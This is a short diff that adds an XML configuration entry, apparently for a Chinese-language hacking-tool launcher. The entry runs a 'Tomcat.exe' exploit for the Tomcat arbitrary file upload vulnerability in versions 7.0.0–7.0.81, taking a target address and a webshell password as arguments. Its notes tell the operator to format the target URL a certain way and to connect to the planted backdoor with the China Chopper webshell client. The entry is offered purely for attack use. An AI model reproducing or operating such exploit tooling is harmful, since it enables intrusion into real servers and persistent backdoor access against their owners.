@@ -1,0 +1,14 @@
+<sfjt>inject</sfjt>
+<cs1mc>地址</cs1mc>
+<cs2mc>一句话密码</cs2mc>
+<zbz>1</zbz>
+<bz1>
+<cmd>Tomcat.exe <cs1/> <cs2/></cmd>
+</bz1>
+<bz>
+Tomcat 任意文件上传漏洞
+Apache Tomcat 7.0.0 - 7.0.81
+
+地址处前面一定要加上协议头 http://，右面一定不要带 /
+一句话密码为生成的后门密码，请用中国菜刀连接！
+</bz>
